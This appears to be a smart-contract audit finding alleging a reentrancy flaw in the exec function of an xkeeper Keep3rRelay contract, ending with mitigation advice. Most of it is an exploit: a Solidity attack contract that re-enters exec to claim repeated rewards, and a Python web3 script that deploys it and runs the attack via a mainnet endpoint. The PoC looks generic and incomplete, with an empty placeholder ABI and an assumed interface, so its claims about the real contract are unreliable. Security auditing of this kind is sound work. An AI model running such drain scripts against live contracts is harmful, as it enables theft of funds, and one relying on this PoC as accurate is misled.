Amateur Silver Corgi

medium

# Reentrancy Attack in Keep3rRelay's exec Function Allowing Unauthorized Manipulation and Excessive Reward Claims

## Summary
The Keep3rRelay contract contains a vulnerability in its `exec` function, which can be exploited by malicious actors to perform a reentrancy attack. This vulnerability allows an attacker to execute malicious jobs in the `Keep3rRelay` system and potentially claim excessive rewards or manipulate the contract in unauthorized ways. By taking advantage of the reentrancy vulnerability, the attacker can repeatedly call the exec function and drain funds from the contract or execute other malicious operations.

## Vulnerability Detail
The `exec` function in the `Keep3rRelay` contract is vulnerable to `reentrancy` attacks due to its lack of proper state management during the execution of a job. This function is responsible for executing jobs in the system, and it includes critical actions such as calling the job's work function and transferring rewards to keepers.

Problem: The `exec` function calls the job's work function, which can potentially be a contract controlled by a malicious actor. This call is made without any reentrancy guard, meaning that the malicious job can reenter the exec function before its execution completes.

## Impact
-    Manipulate the execution flow of the exec function.
-   Repeatedly claim excessive rewards from the Keep3rRelay contract.
-    Interfere with or manipulate the expected job execution logic.
-    Potentially drain funds from the Keep3rRelay contract.

## Code Snippet
https://github.com/sherlock-audit/2024-04-xkeeper/blob/main/xkeeper-core/solidity/contracts/relays/Keep3rRelay.sol#L23


## Proof of Concept 
Deploy The Below Contract
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IKeep3rRelay {
    function addJob(address _job) external;
    function exec(address _job) external;
    function worked(address _keeper) external;
}

contract MaliciousJob {
    IKeep3rRelay public keep3rRelay;
    bool public reentrancyFlag = false;

    // Constructor to initialize the Keep3rRelay address
    constructor(address _keep3rRelay) {
        keep3rRelay = IKeep3rRelay(_keep3rRelay);
    }

    // Function to register this contract as a job with Keep3rRelay
    function registerAsJob() external {
        keep3rRelay.addJob(address(this));
    }

    // Function that gets called when Keep3rRelay executes this job
    function execute() external {
        // Perform malicious actions here
        
        // Call the exec function of Keep3rRelay while it's still executing
        if (!reentrancyFlag) {
            reentrancyFlag = true;
            keep3rRelay.exec(address(this));
        }

        // Mark the job as worked to receive rewards
        keep3rRelay.worked(msg.sender);
    }
}

```
```bash
pip install web3
```

```python
import json
from web3 import Web3
from web3.contract import Contract

# Connection to Ethereum node
infura_url = "https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID"
web3 = Web3(Web3.HTTPProvider(infura_url))

# Check if connected
assert web3.isConnected(), "Failed to connect to Ethereum node."

# Load the ABI and bytecode for the MaliciousJob contract
with open("MaliciousJob.json") as f:
    contract_data = json.load(f)

# Set up the account that will deploy and execute the attack
account_address = "0xYourEthereumAddress"
private_key = "0xYourPrivateKey"

# Load the Keep3rRelay contract address and ABI
keep3r_relay_address = "0xKeep3rRelayContractAddress"
keep3r_relay_abi = [
    # Keep3rRelay ABI details as a list of dicts
    # For example: {"constant": True, "inputs": [...], "name": "addJob", ...},
    # Fill the ABI as needed from the Keep3rRelay contract
]

# Instantiate Keep3rRelay contract
keep3r_relay_contract = web3.eth.contract(address=keep3r_relay_address, abi=keep3r_relay_abi)

# Deploy the MaliciousJob contract
def deploy_malicious_job():
    # Instantiate the MaliciousJob contract
    malicious_job_contract = web3.eth.contract(
        abi=contract_data["abi"],
        bytecode=contract_data["bytecode"]
    )

    # Transaction details
    transaction = {
        "from": account_address,
        "nonce": web3.eth.get_transaction_count(account_address),
        "gas": 2000000,
        "gasPrice": web3.eth.gas_price,
    }

    # Deploy the contract
    tx_hash = malicious_job_contract.constructor(keep3r_relay_address).transact(transaction)
    tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
    
    # Get the contract address from the transaction receipt
    contract_address = tx_receipt.contractAddress
    print(f"MaliciousJob contract deployed at address: {contract_address}")
    
    return contract_address

# Execute the attack
def execute_attack(malicious_job_address):
    # Instantiate the MaliciousJob contract
    malicious_job_abi = contract_data["abi"]
    malicious_job_contract = web3.eth.contract(address=malicious_job_address, abi=malicious_job_abi)

    # Register the malicious job
    tx_hash = malicious_job_contract.functions.registerAsJob().transact({
        "from": account_address,
        "gas": 200000,
        "gasPrice": web3.eth.gas_price,
    })
    web3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"MaliciousJob registered as a job in Keep3rRelay.")

    # Execute the malicious job
    tx_hash = keep3r_relay_contract.functions.exec(malicious_job_address).transact({
        "from": account_address,
        "gas": 300000,
        "gasPrice": web3.eth.gas_price,
    })
    web3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"Executed malicious job.")

if __name__ == "__main__":
    malicious_job_address = deploy_malicious_job()
    execute_attack(malicious_job_address)

```
## Tool used

Manual Review

## Recommendation
-    Implement reentrancy guards in the `exec` function to prevent reentrancy attacks.
-    Use a state management mechanism to track ongoing executions and prevent reentry during job execution.
-    Validate and restrict the types of jobs that can be submitted to the Keep3rRelay system to prevent malicious actors from exploiting the system.